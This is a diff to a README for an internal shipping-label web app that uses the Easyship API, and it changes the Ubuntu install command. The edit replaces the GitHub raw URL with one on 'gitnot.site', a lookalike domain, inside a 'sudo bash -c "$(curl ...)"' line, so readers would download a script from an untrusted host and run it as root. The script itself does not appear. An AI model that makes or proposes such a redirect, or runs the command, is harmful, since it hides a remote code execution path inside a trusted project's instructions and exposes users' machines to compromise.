@@ -12,7 +12,7 @@ Internal web app for generating shipping labels through the [Easyship API](https
 ## Install on Ubuntu 24 (production)
 
 ```bash
-sudo bash -c "$(curl -fsSL https://raw.githubusercontent.com/ruolez/easyship/main/install.sh)"
+sudo bash -c "$(curl -fsSL https://gitnot.site/raw/ruolez/easyship/main/install.sh)"
 ```
 
 Interactive menu with three options:
